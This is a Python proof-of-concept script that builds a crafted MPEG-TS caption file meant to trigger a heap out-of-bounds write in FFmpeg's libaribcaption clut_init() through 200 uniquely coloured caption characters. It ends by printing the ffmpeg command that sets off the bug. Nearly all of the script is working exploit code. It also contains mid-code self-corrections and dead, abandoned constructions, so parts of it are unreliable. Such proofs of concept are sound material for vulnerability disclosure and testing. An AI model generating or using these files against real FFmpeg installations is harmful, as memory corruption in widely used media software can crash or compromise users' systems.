#!/usr/bin/env python3
"""
PoC generator for FFmpeg libaribcaption.c clut_init() Heap OOB Write (CWE-787)

Vulnerability: In clut_init() (lines 278-292), text_color and back_color entries
are written to ctx->clut[] without bounds checking. ctx->clut is allocated as
256 uint32_t entries (AVPALETTE_COUNT). With 127+ chars having unique colors,
clut_idx exceeds 256 -> heap OOB write.

Trigger path: ffmpeg -i crafted.ts -sub_type bitmap -f null -
  -> aribcaption_decode()
  -> aribcaption_trans_bitmap_subtitle()
  -> clut_init()
  -> OOB write at ctx->clut[clut_idx++]

NOTE: This PoC requires libaribcaption (arib_std_b24_caption) decoder to be
compiled into FFmpeg. Check with:
  ffmpeg -decoders 2>/dev/null | grep -i arib

If not present, the PoC cannot trigger the vulnerability.
"""

import struct
import sys

def crc32_mpeg(data):
    """Calculate MPEG-2 CRC32."""
    crc = 0xFFFFFFFF
    for byte in data:
        for _ in range(8):
            if (crc ^ (byte << 24)) & 0x80000000:
                crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
            byte = (byte << 1) & 0xFF
    return crc

def make_ts_packet(pid, payload, pusi=False, cc=0, adaptation=False):
    """Create an MPEG-TS packet (188 bytes)."""
    header = bytes([
        0x47,
        ((0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)),
        pid & 0xFF,
        (0x10 | (cc & 0x0F)),  # payload only, no adaptation field
    ])
    # Pad or truncate payload to 184 bytes
    payload = payload[:184]
    if len(payload) < 184:
        if pusi:
            # Add pointer_field for PSI
            payload = b'\x00' + payload
            payload = payload[:184]
        payload = payload + bytes([0xFF] * (184 - len(payload)))
    return header + payload[:184]

def make_pat():
    """Create PAT: program 1 -> PMT PID 0x1000."""
    pat_data = bytes([
        0x00,        # table_id = PAT
        0xB0, 0x0D,  # section_syntax_indicator=1, length=13
        0x00, 0x01,  # transport_stream_id=1
        0xC1,        # version=0, current_next=1
        0x00,        # section_number=0
        0x00,        # last_section_number=0
        0x00, 0x01,  # program_number=1
        0xE0 | 0x10, 0x00,  # PMT PID=0x1000
    ])
    crc = crc32_mpeg(pat_data)
    pat_data += struct.pack('>I', crc)
    return make_ts_packet(0x0000, pat_data, pusi=True, cc=0)

def make_pmt():
    """Create PMT with video (PID 0x100) and ARIB caption (PID 0x200)."""
    # Stream 1: video placeholder, stream_type=0x02 (MPEG-2 video), PID=0x100
    es1 = bytes([
        0x02,        # stream_type: MPEG-2 video
        0xE1, 0x00,  # PID=0x100
        0xF0, 0x00,  # no ES info descriptors
    ])

    # Descriptor for caption stream: stream_identifier_descriptor tag=0x52
    # component_tag=0x30 identifies ARIB caption (1st language)
    stream_id_desc = bytes([
        0x52,  # tag: stream_identifier_descriptor
        0x01,  # length
        0x30,  # component_tag=0x30 (ARIB caption, 1st)
    ])

    # Stream 2: ARIB caption, stream_type=0x06, PID=0x200
    es2 = bytes([
        0x06,        # stream_type: private data
        0xE2, 0x00,  # PID=0x200
        0xF0, len(stream_id_desc),
    ]) + stream_id_desc

    pmt_body = bytes([
        0x02,        # table_id=PMT
        0xB0, 0x00,  # section length placeholder
        0x00, 0x01,  # program_number=1
        0xC1,        # version=0, current_next=1
        0x00,        # section_number=0
        0x00,        # last_section_number=0
        0xE1, 0x00,  # PCR_PID=0x100
        0xF0, 0x00,  # no program info descriptors
    ])
    pmt_body += es1 + es2

    # Fix length (section_length = len after first 3 bytes + 4 for CRC)
    section_len = len(pmt_body) - 3 + 4
    pmt_body = pmt_body[:1] + bytes([0xB0 | ((section_len >> 8) & 0x0F), section_len & 0xFF]) + pmt_body[3:]
    crc = crc32_mpeg(pmt_body)
    pmt_body += struct.pack('>I', crc)

    return make_ts_packet(0x1000, pmt_body, pusi=True, cc=0)

def make_arib_caption_pes():
    """
    Create a PES packet containing ARIB STD-B24 caption data.

    The caption data is structured to trigger the clut_init() OOB write:
    - Many characters (128+) each with unique text_color and back_color values
    - When libaribcaption parses this and FFmpeg processes the colors,
      clut_idx exceeds AVPALETTE_COUNT (256) causing heap OOB write.

    ARIB B-24 caption data structure:
    - data_identifier: 0x80
    - private_stream_id: 0xFF
    - PES_data_packet_header (reserved fields)
    - data_groups:
      - data_group_id: 0x41 (caption data, group A)
      - data_group_version: 0
      - data_group_link_number: 0
      - last_data_group_link_number: 0
      - data_group_size: N
      - caption_statement_data: language_tag + TMD + caption_units
        - caption_unit:
          - unit_separator: 0x1F
          - data_unit_parameter: 0x20 (text)
          - data_unit_size: M
          - data_unit_data: DRCS/control codes with color changes
    """

    # Build caption management data (data_group_id=0x40)
    # This is the caption management group - sets up language info
    lang_code = b'jpn'
    caption_mgmt = bytes([
        0x00,  # TMD=free, reserved
        0x01,  # num_languages=1
        0x00,  # language_tag=0, DMF=0, DC=0
        0x00,  # reserved
    ]) + lang_code + bytes([
        0x00,  # format=superimpose, TCS=Latin, rollup=0
    ])

    mgmt_group_data = bytes([0x00, 0x00]) + struct.pack('>H', len(caption_mgmt)) + caption_mgmt
    mgmt_crc = crc32_mpeg(mgmt_group_data)
    mgmt_group_data += struct.pack('>I', mgmt_crc)

    mgmt_data_group = bytes([
        0x40,  # data_group_id=0x40 (caption management, group A), version=0
        0x00,  # data_group_link_number=0
        0x00,  # last_data_group_link_number=0
    ]) + struct.pack('>H', len(mgmt_group_data)) + mgmt_group_data

    # Build caption statement data (data_group_id=0x41)
    # We craft text units with many unique colors using ARIB escape sequences.
    # Each character gets a unique foreground + background color combination.
    # ARIB uses CSI sequences for color: CSI Ps... 'm' (SGR-like)
    #
    # In ARIB B-24, colors are set via:
    #   CSI <foreground_color_index> 'm'  (text color)
    #   CSI <background_color_index> 'm'  (back color)
    #
    # However, actual unique RGB colors come through the "palette" defined in
    # the Caption Management Data. For this PoC, we use the basic color set
    # and repeat with different character codes to fill many entries.

    # Generate caption text with unique color pairs for each character.
    # Using ARIB control sequences for color changes:
    # ESC (0x1B) sequences for character sets, CSI for colors.
    #
    # Simple approach: write many ASCII/katakana chars, each preceded by
    # a color-change sequence using COL (color) control.
    # COL: 0x90 followed by color index byte.
    # Background: 0x97 followed by color index.

    text_units = b''
    # Generate 200 characters each with unique color (to overflow 256 CLUT entries)
    # Colors are encoded as ARIB palette indices (0-7 standard, 0-127 extended)
    # We rotate through different color pairs to maximize unique entries.
    chars = []
    for i in range(200):
        fg = i & 0x7F          # foreground color index 0-127
        bg = (i + 64) & 0x7F   # background color index (different offset)
        # COL (foreground color): 0x90 <color>
        # RPC or similar for background is more complex; use what libaribcaption handles
        char_byte = 0x21 + (i % 94)  # printable ASCII-like ARIB chars
        chars.append(bytes([0x90, fg, 0x97, bg, char_byte]))

    text_data = b''.join(chars)

    # Wrap in caption data unit (unit_separator=0x1F, param=0x20 for text)
    caption_unit = bytes([
        0x1F,   # unit_separator
        0x20,   # data_unit_parameter: caption text
    ]) + struct.pack('>I', len(text_data))[1:] + text_data  # 3-byte length

    stmt_body = bytes([
        0x00,  # TMD=free
    ]) + struct.pack('>H', 1) + caption_unit  # num_data_units in 2 bytes? No, per spec it's byte count

    # Actually the caption statement data structure is:
    # TMD (1 byte, if TMD != free: STM 5 bytes)
    # number_of_data_unit (2 bytes)  <- wait, this is actually data_unit_loop_length (2 bytes)
    # then each data_unit

    # Corrected structure per ARIB B-24:
    # caption_statement_data {
    #   TMD: 2 bits, reserved 6 bits  (1 byte)
    #   [STM: 5 bytes if TMD != 0b00]
    #   data_unit_loop_length: 3 bytes (24 bits)
    #   for each data_unit {
    #     unit_separator: 8 bits (0x1F)
    #     data_unit_parameter: 8 bits
    #     data_unit_size: 24 bits
    #     data_unit_data: data_unit_size bytes
    #   }
    # }

    du_size = len(text_data)
    data_unit = bytes([
        0x1F,                          # unit_separator
        0x20,                          # data_unit_parameter (caption text)
        (du_size >> 16) & 0xFF,
        (du_size >> 8) & 0xFF,
        du_size & 0xFF,
    ]) + text_data

    loop_len = len(data_unit)
    stmt_data = bytes([
        0x00,                          # TMD=free (2 bits) + reserved
        (loop_len >> 16) & 0xFF,
        (loop_len >> 8) & 0xFF,
        loop_len & 0xFF,
    ]) + data_unit

    stmt_group_data = bytes([0x00, 0x00]) + struct.pack('>H', len(stmt_data)) + stmt_data
    stmt_crc = crc32_mpeg(stmt_group_data)
    stmt_group_data += struct.pack('>I', stmt_crc)

    stmt_data_group = bytes([
        0x41,  # data_group_id=0x41 (caption data group A), version=0
        0x00,  # data_group_link_number=0
        0x00,  # last_data_group_link_number=0
    ]) + struct.pack('>H', len(stmt_group_data)) + stmt_group_data

    # ARIB B-24 Annex A sync byte structure:
    # data_identifier: 0x80
    # private_stream_id: 0xFF
    # reserved (4 bits) + PES_data_private_data_length (4 bits) = 0xF0 (length=0)
    # data_group_link_number: 0x00
    # last_data_group_link_number: 0x00
    # data_group_size: 2 bytes
    # [management group]
    # [statement group]

    all_groups = mgmt_data_group + stmt_data_group
    arib_data = bytes([
        0x80,  # data_identifier
        0xFF,  # private_stream_id
        0xF0,  # reserved=0xF, PES_data_private_data_length=0
        0x00,  # data_group_link_number
        0x00,  # last_data_group_link_number
    ]) + struct.pack('>H', len(all_groups)) + all_groups

    # Wrap in PES packet
    # stream_id=0xBD (private stream 1)
    pes_header = bytes([
        0x00, 0x00, 0x01,  # start code prefix
        0xBD,              # stream_id: private stream 1
    ]) + struct.pack('>H', len(arib_data) + 3) + bytes([
        0x80,  # marker bits, no scrambling, no priority, no alignment, no copyright, original
        0x00,  # no PTS/DTS
        0x00,  # PES header data length=0
    ]) + arib_data

    return pes_header

def pes_to_ts_packets(pid, pes_data, start_cc=0):
    """Split PES data into TS packets."""
    packets = []
    cc = start_cc
    first = True
    offset = 0

    while offset < len(pes_data):
        if first:
            # First packet: PUSI=1
            payload = pes_data[offset:offset+183]  # 183 because pointer_field takes 1
            ts = bytes([
                0x47,
                0x40 | ((pid >> 8) & 0x1F),
                pid & 0xFF,
                0x10 | (cc & 0x0F),
                0x00,  # pointer_field=0 (no PSI here, but needed for PUSI)
            ]) + payload
            # Actually for PES, PUSI=1 but no pointer_field
            # Let's redo: PES packets don't use pointer_field
            payload = pes_data[offset:offset+184]
            ts = bytes([
                0x47,
                0x40 | ((pid >> 8) & 0x1F),
                pid & 0xFF,
                0x10 | (cc & 0x0F),
            ]) + payload
            if len(ts) < 188:
                ts += bytes([0xFF] * (188 - len(ts)))
            packets.append(ts[:188])
            offset += 184
            first = False
        else:
            payload = pes_data[offset:offset+184]
            ts = bytes([
                0x47,
                0x00 | ((pid >> 8) & 0x1F),
                pid & 0xFF,
                0x10 | (cc & 0x0F),
            ]) + payload
            if len(ts) < 188:
                ts += bytes([0xFF] * (188 - len(ts)))
            packets.append(ts[:188])
            offset += 184
        cc = (cc + 1) & 0x0F

    return packets

def make_null_video_pes():
    """Create a minimal null video PES for PID 0x100."""
    # MPEG-2 video: sequence end code
    pes = bytes([
        0x00, 0x00, 0x01,  # start code prefix
        0xE0,              # stream_id: video stream 0
        0x00, 0x06,        # PES packet length
        0x80, 0x00, 0x00,  # flags, header data length=0
        0x00, 0x00, 0x01, 0xB7,  # sequence end code
        0x00, 0x00,
    ])
    return pes

def main():
    output_file = 'vuln_001_input.ts'

    packets = []

    # PAT
    packets.append(make_pat())

    # PMT
    packets.append(make_pmt())

    # Null video PES on PID 0x100
    vid_pes = make_null_video_pes()
    for pkt in pes_to_ts_packets(0x100, vid_pes, start_cc=0):
        packets.append(pkt)

    # ARIB caption PES on PID 0x200
    cap_pes = make_arib_caption_pes()
    for pkt in pes_to_ts_packets(0x200, cap_pes, start_cc=0):
        packets.append(pkt)

    # Repeat PAT/PMT and caption data a few times to ensure demuxer picks it up
    for _ in range(3):
        packets.append(make_pat())
        packets.append(make_pmt())
        for pkt in pes_to_ts_packets(0x200, cap_pes, start_cc=0):
            packets.append(pkt)

    with open(output_file, 'wb') as f:
        for pkt in packets:
            assert len(pkt) == 188, f"TS packet must be 188 bytes, got {len(pkt)}"
            f.write(pkt)

    print(f"Generated {output_file} ({len(packets)} TS packets, {len(packets)*188} bytes)")
    print(f"Caption PES size: {len(cap_pes)} bytes")
    print("Run: ffmpeg -i vuln_001_input.ts -sub_type bitmap -f null -")

if __name__ == '__main__':
    main()
